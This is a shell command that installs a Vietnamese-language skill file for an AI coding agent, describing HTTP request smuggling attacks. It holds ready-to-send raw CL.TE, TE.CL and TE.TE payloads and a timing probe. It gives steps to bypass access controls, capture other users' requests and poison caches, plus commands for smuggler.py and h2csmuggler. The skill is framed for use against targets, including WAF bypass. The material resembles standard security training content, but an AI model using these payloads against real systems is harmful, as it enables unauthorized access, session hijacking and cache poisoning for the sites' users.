cat << 'EOF' > ~/.config/opencode/skills/3_serverside/http-request-smuggling/SKILL.md
---
name: http-request-smuggling
description: Kỹ thuật tấn công HTTP Request Smuggling (HTTP Desync) khai thác sự bất đồng bộ trong cách phân tích header Content-Length và Transfer-Encoding giữa frontend proxy và backend server. Hỗ trợ các biến thể CL.TE, TE.CL, TE.TE và HTTP/2 downgrade.
when_to_use: Kích hoạt khi target sử dụng kiến trúc có reverse proxy/load balancer (Cloudflare, Nginx, HAProxy, Varnish) đứng trước backend, và có dấu hiệu xử lý bất thường các header Transfer-Encoding/Content-Length. Đặc biệt hữu ích khi cần bypass WAF, chiếm đoạt request của user khác, hoặc poison cache.
tags: [http-smuggling, desync, cl-te, te-cl, te-te, h2c, waf-bypass, cache-poisoning]
---

# HTTP Request Smuggling (HTTP Desync)

## 1. Tổng quan
HTTP Request Smuggling (CWE-444) xảy ra khi các thành phần trong hạ tầng web (proxy, load balancer, backend server) **diễn giải ranh giới của một HTTP request theo cách khác nhau**. Kẻ tấn công gửi một request "mơ hồ" mà frontend hiểu là một request, nhưng backend lại hiểu thành hai request, từ đó "buôn lậu" (smuggle) một request ẩn vào bên trong request hợp lệ.

**Hệ quả:** Bypass kiểm soát truy cập, chiếm session của user khác, poison cache (CPDoS), hoặc tấn công SSRF nội bộ.

## 2. Các biến thể tấn công (Bắt buộc nắm vững)

### 2.1. CL.TE (Frontend dùng Content-Length, Backend dùng Transfer-Encoding)
- **Cơ chế:** Frontend đọc `Content-Length` để xác định kết thúc request. Backend lại ưu tiên `Transfer-Encoding: chunked`.
- **Payload mẫu:**
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
- **Kỳ vọng:** Backend dừng ở chunk `0`, phần còn lại (`GET /404...`) bị đẩy vào buffer và xử lý như request tiếp theo.

### 2.2. TE.CL (Frontend dùng Transfer-Encoding, Backend dùng Content-Length)
- **Cơ chế:** Frontend xử lý chunked encoding đúng, nhưng backend lại tin vào `Content-Length`.
- **Payload mẫu:**
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Content-Length: 0

0
- **Kỳ vọng:** Backend dừng sớm, phần payload còn lại được diễn giải thành request mới (`GET /admin`).

### 2.3. TE.TE (Obfuscated Transfer-Encoding)
- **Cơ chế:** Cả hai server đều hỗ trợ `Transfer-Encoding`, nhưng một bên bị đánh lừa bởi header bị làm rối (obfuscation).
- **Kỹ thuật obfuscation phổ biến:**
  - Thêm khoảng trắng: `Transfer-Encoding: chunked` (có tab)
  - Nhân đôi header: `Transfer-Encoding: chunked` + `Transfer-Encoding: identity`
  - Dùng ký tự không chuẩn: `Transfer-Encoding: xchunked`
- **Payload mẫu:**
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 44
Transfer-Encoding: chunked
Transfer-Encoding: identity

0

GET /404 HTTP/1.1
Foo: bar
- **Kỳ vọng:** Một server bỏ qua header bị lỗi, server còn lại xử lý chunked → desync.

### 2.4. HTTP/2 Downgrade & H2C Smuggling
- **Bối cảnh:** Client dùng HTTP/2, nhưng proxy "hạ cấp" (downgrade) xuống HTTP/1.1 cho backend. Quá trình chuyển đổi có thể tái tạo sai `Content-Length` hoặc tái đưa các header bị cấm (forbidden headers) vào request.
- **H2C (HTTP/2 Cleartext):** Lợi dụng cơ chế nâng cấp `Upgrade: h2c` để tạo tunnel HTTP/2 qua proxy, từ đó request các path bị chặn.
- **Công cụ:** `h2csmuggler` (BishopFox) chuyên tự động hóa vector này.

## 3. Quy trình phát hiện & khai thác

### Bước 1 — Xác định kiến trúc
- Dùng `curl -I` hoặc `nmap -sV` để nhận diện proxy/load balancer (Server header, Via, X-Cache, CF-RAY).
- Kiểm tra xem target có hỗ trợ HTTP/2 không (`curl --http2 -I`).

### Bước 2 — Phát hiện Desync (Timing-based)
Gửi payload có chèn lệnh `sleep` để đo thời gian phản hồi.
- **CL.TE probe:**
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
0

Gửi request này, sau đó gửi một request bình thường. Nếu request thứ hai bị trễ bất thường → có desync.

### Bước 3 — Xác thực & Khai thác
- **Bypass Access Control:** Smuggle request `GET /admin` để truy cập endpoint bị chặn.
- **Chiếm session:** Smuggle request `POST /post/comment` với `Content-Length` lớn hơn để "bắt" request của user tiếp theo vào comment.
- **Cache Poisoning:** Smuggle request độc hại để poison cache của response.

## 4. Công cụ hỗ trợ (Có sẵn trên Kali)

| Tool | Mục đích | Lệnh mẫu |
|------|----------|----------|
| **Burp Suite (HTTP Request Smuggler)** | Phát hiện & khai thác tự động | Cài từ BApp Store, dùng tab "Smuggle probe" |
| **smuggler.py** (defparam) | CLI fuzzing CL/TE | `python3 smuggler.py -u https://target.com -m exploit` |
| **h2csmuggler** (BishopFox) | H2C upgrade smuggling | `python3 h2csmuggler.py --scan-list urls.txt --threads 5` |
| **Turbo Intruder** (Burp BApp) | Gửi payload tốc độ cao, single-packet attack | Dùng script `race.py` hoặc custom desync script |
| **curl --raw** | Gửi request thủ công, không bị tool tự động sửa lỗi | `curl --raw -X POST ...` |

> **Lưu ý:** Burp Repeater mặc định sẽ tự động sửa `Content-Length`. Phải tắt "Update Content-Length" trong Repeater menu trước khi test.


